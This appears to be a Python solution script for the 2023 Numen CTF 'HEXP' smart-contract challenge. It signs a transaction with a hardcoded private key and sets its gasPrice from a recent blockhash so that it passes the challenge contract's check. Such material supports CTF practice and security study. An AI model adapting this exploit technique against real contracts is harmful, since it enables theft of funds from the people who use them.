#writeup: https://defihacklabs.substack.com/p/2023-numen-ctf-writeup-hexp

from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware

web3 = Web3(HTTPProvider('http://8.218.239.44:8545/'))
web3.middleware_onion.inject(geth_poa_middleware, layer=0) 


from_acc = '0xC9d88f58258B264b6110D6D0d4612c3228DaeEfc'
private_key = '0xc41402539e8875ba2e4c5ef1f08aac6ba86c32218d585a068447ac5710adf414'

to_acc = '0xA9128DFAA633F3F5d16d8d5E9A73214a57de919B'

nonce = web3.eth.getTransactionCount(from_acc)
number = web3.eth.get_block_number() + 1
print("Block num to be mined: ", number)
blockhash = web3.eth.get_block(number - 10).hash.hex()
print("Blockhash of 10 blocks before : ", blockhash)
gasPrice = int(hex(int(hex(int(blockhash, 16) & 0xffffff),16) + 0x100000000 + 0x10000000),16)
print(hex(gasPrice))
gasLimit = 3000000
value = 0

tx = {
    'nonce': nonce,
    'to': to_acc,
    'value': value,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'chainId': 22574,
    'data': "0x00000000"
}

signed_tx = web3.eth.account.sign_transaction(tx, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(transaction_hash)
print(tx_receipt['status'])
